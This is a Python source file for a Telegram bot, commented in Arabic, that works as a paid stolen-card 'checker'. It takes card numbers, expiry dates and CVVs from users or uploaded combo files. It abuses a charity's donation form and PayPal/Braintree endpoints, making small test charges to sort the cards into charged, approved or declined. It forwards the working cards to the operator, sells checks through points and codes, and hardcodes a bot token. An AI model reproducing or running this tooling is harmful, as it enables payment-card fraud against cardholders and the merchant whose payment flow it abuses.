import random
import string
import telebot
import time
import threading
import cloudscraper
from telebot import types
import requests
import os
import pickle
import re
import json
from bs4 import BeautifulSoup
from datetime import datetime, timedelta

# ==================== ملفات التخزين ====================
POINTS_FILE = "points.json"
BANNED_FILE = "banned.json"
CODES_FILE = "codes.json"
SUBSCRIPTIONS_FILE = "subscriptions.json"

# دالة إنشاء الملف إذا مش موجود
def ensure_file_exists(file_path):
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            json.dump({}, f, indent=4)

# تحميل بيانات النقاط
def load_points():
    ensure_file_exists(POINTS_FILE)
    with open(POINTS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_points(points):
    with open(POINTS_FILE, 'w') as f:
        json.dump(points, f, indent=4)

# تحميل بيانات المحظورين
def load_banned():
    ensure_file_exists(BANNED_FILE)
    with open(BANNED_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_banned(banned):
    with open(BANNED_FILE, 'w') as f:
        json.dump(banned, f, indent=4)

# تحميل بيانات الاشتراكات الزمنية
def load_subscriptions():
    ensure_file_exists(SUBSCRIPTIONS_FILE)
    with open(SUBSCRIPTIONS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_subscriptions(subscriptions):
    with open(SUBSCRIPTIONS_FILE, 'w') as f:
        json.dump(subscriptions, f, indent=4)

def has_active_subscription(user_id):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    if user_id_str not in subs:
        return False
    expiry_str = subs[user_id_str]
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        return expiry > datetime.now()
    except:
        return False

def set_subscription(user_id, hours):
    expiry = datetime.now() + timedelta(hours=hours)
    expiry_str = expiry.strftime("%Y-%m-%d %H:%M")
    subs = load_subscriptions()
    subs[str(user_id)] = expiry_str
    save_subscriptions(subs)

# تحميل بيانات الأكواد
def load_codes():
    ensure_file_exists(CODES_FILE)
    with open(CODES_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=4)

def generate_code(hours, target_user_id=None):
    characters = string.ascii_uppercase + string.digits
    code = 'TOME-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4))
    expiry = datetime.now() + timedelta(hours=hours)
    codes = load_codes()
    codes[code] = {
        "hours": hours,
        "target_user": target_user_id,
        "expiry": expiry.strftime("%Y-%m-%d %H:%M"),
        "used": False
    }
    save_codes(codes)
    return code

def redeem_code(code, user_id):
    codes = load_codes()
    if code not in codes:
        return False, "الكود غير صحيح"
    code_data = codes[code]
    if code_data["used"]:
        return False, "تم استخدام هذا الكود بالفعل"
    expiry = datetime.strptime(code_data["expiry"], "%Y-%m-%d %H:%M")
    if expiry < datetime.now():
        return False, "انتهت صلاحية الكود"
    target = code_data["target_user"]
    if target is not None and target != user_id:
        return False, "هذا الكود ليس مخصص لك"
    hours = code_data["hours"]
    set_subscription(user_id, hours)
    code_data["used"] = True
    save_codes(codes)
    return True, f"تم تفعيل الاشتراك لمدة {hours} ساعة"

# ==================== دوال النقاط ====================
def has_points(user_id, required=1):
    if has_active_subscription(user_id):
        return True
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points:
        return False
    return points[user_id_str] >= required

def deduct_points(user_id, required=1):
    if has_active_subscription(user_id):
        return True
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points or points[user_id_str] < required:
        return False
    points[user_id_str] -= required
    save_points(points)
    return True

def add_points(user_id, amount):
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points:
        points[user_id_str] = 0
    points[user_id_str] += amount
    save_points(points)

def set_points(user_id, amount):
    points = load_points()
    user_id_str = str(user_id)
    points[user_id_str] = amount
    save_points(points)

def get_points(user_id):
    points = load_points()
    user_id_str = str(user_id)
    return points.get(user_id_str, 0)

def is_banned(user_id):
    banned = load_banned()
    return str(user_id) in banned

def ban_user(user_id):
    banned = load_banned()
    banned[str(user_id)] = True
    save_banned(banned)

def unban_user(user_id):
    banned = load_banned()
    if str(user_id) in banned:
        del banned[str(user_id)]
        save_banned(banned)

# توليد اسم عشوائي
def random_name():
    first_names = ["Ahmed", "Omar", "Kareem", "Youssef", "Ibrahim", "Mostafa", "Ali"]
    last_names  = ["Hassan", "Mohamed", "Fathy", "Adel", "Saeed", "Gamal", "Khaled"]
    return random.choice(first_names), random.choice(last_names)

# توليد بريد عشوائي
def random_email():
    letters = string.ascii_lowercase + string.digits
    username = ''.join(random.choices(letters, k=10))
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    return f"{username}@{random.choice(domains)}"

# توليد عنوان عشوائي
def random_address():
    streets = ["Street 12", "Main Road", "West Avenue", "North Street", "Central Area"]
    cities  = ["Cairo", "Giza", "Alexandria", "Mansoura", "Tanta"]
    return f"{random.choice(streets)}, {random.choice(cities)}, Egypt"

# توليد اسم صاحب البطاقة
def random_card_name():
    first, last = random_name()
    return f"{first} {last}"

# توليد القيم
first, last = random_name()
email = random_email()
address = random_address()
card_name = random_card_name()

# توكن البوت
token = "8520709238:AAFf1psOsYuulYR2goGOYEObBunbd42mlrA"
bot = telebot.TeleBot(token, parse_mode="HTML")

# ايدي حسابك
admin = 1093032296
myid = ['1093032296']
stop = {}
user_gateways = {}
stop_flags = {} 
stopuser = {}
command_usage = {}
active_scans = set()

mes = types.InlineKeyboardMarkup()
mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))

# كلمات التفعيل
APPROVED_KEYWORDS = ['𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥', 'Insufficient Funds ✅', 'Charged']

@bot.message_handler(commands=["start"])
def handle_start(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    username = message.from_user.username
    
    if is_banned(user_id):
        bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    # إشعار المالك بمستخدم جديد
    msg_to_admin = f"🆕 مستخدم جديد دخل البوت!\n👤 الاسم: {first_name}\n🆔 ID: {user_id}\n📛 اليوزر: @{username if username else 'لا يوجد'}"
    bot.send_message(admin, msg_to_admin)
    
    sent_message = bot.send_message(chat_id=message.chat.id, text="👹 Starting...")
    time.sleep(1)
    name = message.from_user.first_name
    
    if has_active_subscription(user_id):
        expiry = load_subscriptions().get(str(user_id), "غير معروف")
        bot.edit_message_text(chat_id=message.chat.id,
                              message_id=sent_message.message_id,
                              text=f"Hi {name}, Welcome to joker checker (PayPal Custom Charge)\n✅ اشتراكك نشط حتى: {expiry}\n📊 نقاطك: {get_points(user_id)}",
                              reply_markup=mes)
    else:
        bot.edit_message_text(chat_id=message.chat.id,
                              message_id=sent_message.message_id,
                              text=f"Hi {name}, Welcome to joker checker (PayPal Custom Charge)\n📊 نقاطك: {get_points(user_id)}\nللحصول على نقاط تواصل مع المالك: @Jo0000ker",
                              reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    user_id = call.from_user.id
    name = call.from_user.first_name
    
    if is_banned(user_id):
        bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    bot.send_message(call.message.chat.id, 
        f'''- مرحباً بك في بوت فحص PayPal Custom Charge✅

للفحص اليدوي [/chk] و للكومبو فقط ارسل الملف.

نقاطك الحالية: {get_points(user_id)}
للحصول على نقاط تواصل مع المالك: @Jo0000ker''')

    bot.edit_message_text(chat_id=call.message.chat.id,
                          message_id=call.message.message_id,
                          text=f"Hi {name}, Welcome to joker checker (PayPal Custom Charge)",
                          reply_markup=mes)

# ==================== أمر /cmds ====================
@bot.message_handler(commands=["cmds"])
def admin_commands(message):
    user_id = message.from_user.id
    
    if user_id != admin:
        if is_banned(user_id):
            bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
            return
        bot.send_message(chat_id=message.chat.id, text=f'''
📋 أوامر البوت:
• /chk بطاقة|شهر|سنة|cvv - فحص بطاقة
• /mypoints - عرض رصيد نقاطك
• /redeem كود - تفعيل كود اشتراك
• /start - بدء البوت
• /cmds - عرض الأوامر

نقاطك الحالية: {get_points(user_id)}
''')
        return
    
    commands_text = '''
👑 أوامر المالك 👑

━━━━━━━━━━━━━━━━
📦 أوامر الأكواد والاشتراكات:
• /code عدد_الساعات - إنشاء كود لنفسك
• /code عدد_الساعات user_id - إنشاء كود لمستخدم

━━━━━━━━━━━━━━━━
⭐ أوامر النقاط:
• /addpoints ID عدد - إضافة نقاط
• /rempoints ID عدد - حذف نقاط
• /setpoints ID عدد - تعيين رصيد نقاط
• /points ID - عرض رصيد مستخدم

━━━━━━━━━━━━━━━━
🚫 أوامر الحظر:
• /block ID - حظر مستخدم
• /unblock ID - إلغاء حظر

━━━━━━━━━━━━━━━━
📋 أوامر المستخدمين:
• /mypoints - عرض رصيدك
• /chk بطاقة|شهر|سنة|cvv - فحص بطاقة
• /redeem كود - تفعيل كود اشتراك
• /start - بدء البوت
• /cmds - عرض الأوامر

━━━━━━━━━━━━━━━━
💡 ملاحظة: الاشتراك الزمني يلغي استهلاك النقاط
'''
    bot.send_message(admin, commands_text)

import requests,base64
from bs4 import BeautifulSoup
import pycountry
import re
from datetime import datetime

def UniversalBraintreeChecker(ccx):
    import string,bs4,cloudscraper,random,requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    
    pipo = requests.session()		
    url = 'https://fightagainstpovertyassociation.com/donations/school-fees/'
    
    url_1 ='https://fightagainstpovertyassociation.com/wp-admin/admin-ajax.php'
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    r = pipo.get(url, headers=headers)
    html = r.text
    
    hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
    iid = re.search(r'name="give-form-id" value="(.*?)"',html).group(1)
    prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
    lol = re.search(r'"data-client-token":"(.*?)"',html).group(1)
    kol = base64.b64decode(lol).decode('utf-8')
    la = re.findall(r'"accessToken":"(.*?)"', kol)[0]
    
    headers = {
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    params = {
        'action': 'give_paypal_commerce_create_order',
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': prefix,
        'give-form-id': iid,
        'give-form-title': 'Donation Form',
        'give-current-url': url,
        'give-form-url': url,
        'give-form-minimum': '0.50',
        'give-form-maximum': '999999.99',
        'give-form-hash': hash,
        'give-price-id': 'custom',
        'give-amount': '0.50',
        'payment-mode': 'paypal-commerce',
        'give_first': 'ahmed',
        'give_last': 'Mohmaed',
        'give_email': 'ahzd42968@gmail.com',
        'give_comment': '',
        'card_name': 'Heueheb',
        'card_exp_month': '',
        'card_exp_year': '',
        'give-gateway': 'paypal-commerce',
    }
    r = pipo.post(url_1, params=params, headers=headers, data=data)
    kok = r.json()['data']['id']
    
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'ar-MM,ar;q=0.9,en-MM;q=0.8,en;q=0.7,en-US;q=0.6',
        'authorization': f'Bearer {la}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'paypal-client-metadata-id': '5e18a562ee0f36fa5d75570b57b56dbd',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': '20' + yy + '-' + mm,
                'security_code': cvc,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }
    
    r = pipo.post(f'https://cors.api.paypal.com/v2/checkout/orders/{kok}/confirm-payment-source', headers=headers, json=json_data)
    
    headers = {
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'action': 'give_paypal_commerce_approve_order',
        'order': kok,
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': prefix,
        'give-form-id': iid,
        'give-form-title': 'Donation Form',
        'give-current-url': url,
        'give-form-url': url,
        'give-form-minimum': '0.50',
        'give-form-maximum': '999999.99',
        'give-form-hash': hash,
        'give-price-id': 'custom',
        'give-amount': '0.50',
        'payment-mode': 'paypal-commerce',
        'give_first': 'ahmed',
        'give_last': 'Mohmaed',
        'give_email': 'ahzd42968@gmail.com',
        'give_comment': '',
        'card_name': 'Heueheb',
        'card_exp_month': '',
        'card_exp_year': '',
        'give-gateway': 'paypal-commerce',
    }
    
    r = pipo.post(url_1, params=params, headers=headers, data=data)
    text = r.text.upper()

    # ✅ CHARGE الحقيقي
    if '"STATUS":"COMPLETED"' in text and '"RESPONSE_CODE":"0000"' in text:
        return "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 "
    elif 'DO_NOT_HONOR' in text:     		  	
        return "DO_NOT_HONOR"  		
    elif 'COMPLETED' in text:     		  	
        return "Approved No 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 "    		    
    elif 'ACCOUNT_CLOSED' in text:
        return "ACCOUNT_CLOSED"    
    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:  
        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"        
    elif 'LOST_OR_STOLEN' in text:    
        return "LOST_OR_STOLEN"         
    elif 'CVV2_FAILURE' in text:    
        return "CVV2_FAILURE"          
    elif 'SUSPECTED_FRAUD' in text:    
        return "SUSPECTED_FRAUD"         
    elif 'INVALID_ACCOUNT' in text:    
        return "INVALID_ACCOUNT"         
    elif 'REATTEMPT_NOT_PERMITTED' in text:    
        return "REATTEMPT_NOT_PERMITTED"         
    elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:    
        return "ACCOUNT_BLOCKED_BY_ISSUER"         
    elif 'ORDER_NOT_APPROVED' in text:    
        return "ORDER_NOT_APPROVED"
    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:    
        return "PICKUP_CARD_SPECIAL_CONDITIONS"        
    elif 'PAYER_CANNOT_PAY' in text:    
        return "PAYER_CANNOT_PAY"        
    elif 'INSUFFICIENT_FUNDS' in text:    
        return f"Insufficient Funds ✅"        
    elif 'GENERIC_DECLINE' in text:    
        return "GENERIC_DECLINE"        
    elif 'COMPLIANCE_VIOLATION' in text:    
        return "COMPLIANCE_VIOLATION"    
    elif 'TRANSACTION_NOT_PERMITTED' in text:    
        return "TRANSACTION_NOT_PERMITTED"        
    elif 'PAYMENT_DENIED' in text:    
        return "PAYMENT_DENIED"    
    elif 'INVALID_MERCHANT' in text:    
        return "INVALID_MERCHANT"    
    elif 'AMOUNT_EXCEEDED' in text:    
        return "AMOUNT_EXCEEDED"                            
    elif 'INVALID_TRANSACTION' in text:    
        return "INVALID_TRANSACTION"        
    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:    
        return "RESTRICTED_OR_INACTIVE_ACCOUNT"    
    elif 'SECURITY_VIOLATION' in text:    
        return "SECURITY_VIOLATION"        
    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:    
        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"  
    elif 'INVALID_OR_RESTRICTED_CARD' in text:    
        return "INVALID_OR_RESTRICTED_CARD"   
    elif 'EXPIRED_CARD' in text:    
        return "EXPIRED_CARD"        
    elif 'CRYPTOGRAPHIC_FAILURE' in text:    
        return "CRYPTOGRAPHIC_FAILURE"                    
    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:    
        return "TRANSACTION_CANNOT_BE_COMPLETED"        
    elif 'DECLINED_PLEASE_RETRY' in text:    
        return "DECLINED_PLEASE_RETRY"        
    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:    
        return "TX_ATTEMPTS_EXCEED_LIMIT"		
    else:
        return text[:50]

def reg(cc):
    regex = r'\d+'
    matches = re.findall(regex, cc)
    match = ''.join(matches)
    n = match[:16]
    mm = match[16:18]
    yy = match[18:20]
    if yy == '20':
        yy = match[18:22]
        if n.startswith("3"):
            cvc = match[22:26]
        else:
            cvc = match[22:25]
    else:
        if n.startswith("3"):
            cvc = match[20:24]
        else:
            cvc = match[20:23]
    cc = f"{n}|{mm}|{yy}|{cvc}"
    if not re.match(r'^\d{16}$', n):
        return
    if not re.match(r'^\d{3,4}$', cvc):
        return
    return cc

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
        brand=api_url["brand"]
        card_type=api_url["type"]
        level=api_url["level"]
        bank=api_url["bank"]
        country_name=api_url["country_name"]
        country_flag=api_url["country_flag"]
        mn = f'''[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐁𝐚𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
        return mn
    except Exception as e:
        print(e)
        return 'No info'

# ==================== أمر /chk ====================
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def my_ali4(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    if not has_points(user_id, 1):
        points = get_points(user_id)
        if has_active_subscription(user_id):
            pass
        else:
            bot.reply_to(message, f"❌ نقاطك غير كافية!\nلديك {points} نقطة وتحتاج 1 نقطة لفحص بطاقة.\nللحصول على نقاط تواصل مع @Jo0000ker")
            return
    
    ko = bot.reply_to(message, "- Wait checking your card ...").message_id
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    if not deduct_points(user_id, 1):
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="❌ حدث خطأ في خصم النقاط، حاول مرة أخرى.")
        return
    
    start_time = time.time()
    try:
        last = str(UniversalBraintreeChecker(cc))
    except Exception as e:
        last = 'Error'
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    # إشعار للمالك عند التفعيل
    if any(kw in last for kw in APPROVED_KEYWORDS):
        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {last}"
        bot.send_message(admin, admin_notify)
    
    msg = f'''<strong>#PayPal Custom Charge 🔥 [/chk]
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'PayPal Custom Charge! ✅' if ('Insufficient Funds' in last or '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ' in last) else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: J0oker
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: Jo0ker</strong>'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

# ==================== معالجة الملفات ====================
@bot.message_handler(content_types=['document'])
def GTA(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error downloading file: {e}")
        return
    
    lines = downloaded.decode('utf-8', errors='ignore').splitlines()
    total_cards = len([line for line in lines if line.strip()])
    
    if total_cards == 0:
        bot.reply_to(message, "❌ الملف فاضي!")
        return
    
    if not has_points(user_id, total_cards):
        points = get_points(user_id)
        if has_active_subscription(user_id):
            pass
        else:
            bot.reply_to(message, f"❌ نقاطك غير كافية!\nلديك {points} نقطة وتحتاج {total_cards} نقطة لفحص هذا الملف.\nللحصول على نقاط تواصل مع @Jo0000ker")
            return
    
    if user_id in active_scans:
        bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت")
        return
    
    if not deduct_points(user_id, total_cards):
        bot.reply_to(message, "❌ حدث خطأ في خصم النقاط")
        return
    
    bts = types.InlineKeyboardMarkup()
    soso = types.InlineKeyboardButton(text='PayPal Custom Charge', callback_data='ottpa2')
    bts.add(soso)
    bot.reply_to(message, 'Select the type of examination', reply_markup=bts)

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
    def my_ali():
        user_id = str(call.from_user.id)
        user_id_int = call.from_user.id
        charged_count = 0
        approved_count = 0
        declined_count = 0
        filename = f"com{user_id}.txt"
        
        if user_id_int in active_scans:
            return
        else:
            active_scans.add(user_id_int)
        
        if not os.path.exists(filename):
            bot.send_message(call.from_user.id, f"❌ خطأ: الملف غير موجود")
            active_scans.remove(user_id_int)
            return
        
        try:
            with open(filename, 'r') as file:
                lino = file.readlines()
                total = len(lino)
        except Exception as e:
            bot.send_message(call.from_user.id, f"❌ خطأ في قراءة الملف: {e}")
            active_scans.remove(user_id_int)
            return
        
        if total == 0:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="❌ الملف فاضي!")
            active_scans.remove(user_id_int)
            return
        
        stopuser.setdefault(user_id, {})['status'] = 'start'
        
        # إنشاء واجهة الفحص
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop'))
        
        # إرسال واجهة الفحص
        status_msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"- Checker To PayPal Custom Charge ☑️\n- Please Wait Processing Your File ..",
            reply_markup=keyboard
        )
        
        for idx, cc in enumerate(lino):
            if stopuser.get(user_id, {}).get('status') == 'stop':
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=status_msg.message_id,
                    text=f'''The Has Stopped Checker PayPal Custom Charge. 🤓

𝐂𝐡𝐚𝐫𝐠𝐞𝐝! : {charged_count}
Approved! : {approved_count}
Declined! : {declined_count}
Total! : {charged_count + approved_count + declined_count} / {total}
Dev! : @Jo0000ker''')
                break
            
            cc = cc.strip()
            if not cc:
                continue
            
            try:
                start_time = time.time()
                last = str(UniversalBraintreeChecker(cc))
                execution_time = time.time() - start_time
            except Exception as e:
                last = "ERROR"
                execution_time = 0
            
            # تحديث واجهة الفحص
            mes = types.InlineKeyboardMarkup(row_width=1)
            cm1 = types.InlineKeyboardButton(f"• {cc[:20]}... •", callback_data='u8')
            status = types.InlineKeyboardButton(f"- Status! : {last[:30]} •", callback_data='u8')
            cm3 = types.InlineKeyboardButton(f"- 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 : [ {charged_count} ] •", callback_data='x')
            cm6 = types.InlineKeyboardButton(f"- 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅ : [ {approved_count} ] •", callback_data='x')					
            cm4 = types.InlineKeyboardButton(f"- Declined! ❌ : [ {declined_count} ] •", callback_data='x')
            cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
            stop_btn = types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop')
            mes.add(cm1, status, cm3, cm6, cm4, cm5, stop_btn)
            
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=status_msg.message_id,
                    text=f'''- Checker To PayPal Custom Charge ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
            except:
                pass
            
            n = cc.split("|")[0] if "|" in cc else cc[:16]
            mm = cc.split("|")[1] if "|" in cc else "00"
            yy = cc.split("|")[2] if "|" in cc else "00"
            cvc = cc.split("|")[3].strip() if "|" in cc else "000"
            cc_formatted = f"{n}|{mm}|{yy}|{cvc}"
            
            # إشعار للمالك عند التفعيل
            if '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥' in last:
                name = call.from_user.first_name
                admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc_formatted}\n📝 الرد: {last}"
                bot.send_message(admin, admin_notify)
                charged_count += 1
                
                msg = f'''<strong>#PayPal_Custom_Charge 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc_formatted}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ! ✅</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc_formatted[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: J0oker
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: Jo0ker</strong>'''
                bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                
            elif any(x in last for x in ["Funds", "Insufficient Funds ✅", "added", "Duplicate", "Approved", "CVV", "Approved No"]):
                approved_count += 1
                
                msg = f'''<strong>#PayPal_Custom_Charge 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc_formatted}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ! ✅</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc_formatted[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: J0oker
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: Jo0ker</strong>'''
                bot.send_message(call.from_user.id, msg, parse_mode="HTML")
            else:
                declined_count += 1
            
            time.sleep(16)
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=status_msg.message_id,
            text=f'''The Inspection Was Completed By PayPal Custom Charge Pro. 🥳

𝐂𝐡𝐚𝐫𝐠𝐞𝐝!: {charged_count}
Approved!: {approved_count}
Declined!: {declined_count}
Total!: {charged_count + approved_count + declined_count}
Dev!: @Jo0000ker''')
        
        try:
            os.remove(filename)
        except:
            pass
        
        if user_id_int in active_scans:
            active_scans.remove(user_id_int)
    
    my_thread = threading.Thread(target=my_ali)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

# ==================== أمر /code ====================
@bot.message_handler(commands=["code"])
def code_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        hours = int(parts[1])
        target_user = None
        if len(parts) >= 3:
            target_user = int(parts[2])
        code = generate_code(hours, target_user)
        if target_user:
            bot.reply_to(message, f"✅ تم إنشاء كود للمستخدم {target_user}\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة")
            try:
                bot.send_message(target_user, f"🎉 تم إنشاء كود اشتراك لك!\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة", parse_mode="HTML")
            except:
                pass
        else:
            bot.reply_to(message, f"✅ تم إنشاء كود لك\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة", parse_mode="HTML")
